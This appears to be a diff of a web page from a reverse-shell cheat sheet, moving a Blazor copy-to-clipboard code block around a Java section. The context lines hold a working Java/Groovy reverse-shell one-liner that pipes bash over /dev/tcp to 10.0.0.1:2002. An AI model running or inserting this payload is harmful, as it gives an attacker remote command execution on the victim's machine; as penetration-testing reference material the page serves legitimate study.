@@ -161,7 +161,18 @@
 </code></pre><p> </p>
 <h2 id="java">Java</h2>
 <p> </p>
-<pre><code>r = Runtime.getRuntime()
+<pre>
+<div class="position-relative" style="background-color: #f5f5f5">
+    <pre>
+    <code @ref="_codeElement">
+            @ChildContent
+        </code>
+    </pre>
+    <div style="position:absolute; top: 10px; right: 10px;">
+        <button type="button" class="btn btn-primary" @onclick="CopyTextToClipboard">Copy</button>
+    </div>
+</div>
+<code>r = Runtime.getRuntime()
 p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
 p.waitFor()
 </code></pre>
@@ -173,19 +184,6 @@ p.waitFor()
 			</div>
 		</div>
 	</div>
-@inject IJSRuntime JSRuntime
-
-<div class="position-relative" style="background-color: #f5f5f5">
-    <pre>
-    <code @ref="_codeElement">
-            @ChildContent
-        </code>
-    </pre>
-    <div style="position:absolute; top: 10px; right: 10px;">
-        <button type="button" class="btn btn-primary" @onclick="CopyTextToClipboard">Copy</button>
-    </div>
-</div>
-
 @code {
 
     private ElementReference _codeElement;
@@ -227,7 +225,7 @@ if (!doNotTrack) {
 
 
 <script  src="https://www.offsec.dev/js/canvas.js"></script>
-
+@inject IJSRuntime JSRuntime
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 
 <script src="https://www.offsec.dev/js/bootstrap.min.js"></script>
